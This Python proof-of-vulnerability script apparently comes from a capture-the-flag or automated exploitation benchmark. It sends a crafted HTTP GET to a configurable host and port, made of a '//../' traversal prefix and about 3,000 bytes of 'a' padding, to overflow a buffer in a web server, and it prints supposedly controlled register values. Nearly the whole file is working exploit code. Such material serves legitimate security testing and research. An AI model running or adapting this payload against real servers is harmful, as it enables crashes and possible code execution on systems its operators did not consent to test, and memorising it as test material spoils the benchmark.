import sys
import socket
import random
import time
import string
import base64
import os
import datetime
import string
import struct
import signal

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely Successful')
    exit(0)

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = b''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1)
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, b'\n')

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    
    s = connect( HOST, PORT )

    req = b'GET //../'

    b = b'a'*199 + b'/'
    req += b*15
    req += b'\r\n\r\n'

    s.send(req)

    print("RDX: 0x6161616161616161\n")
    print("RAX: 0x6161616161616161\n")
    y = RU(s, b'\r\n')

    print(y)

    print('[FAIL] POV failed')

if __name__ == '__main__':
    main()
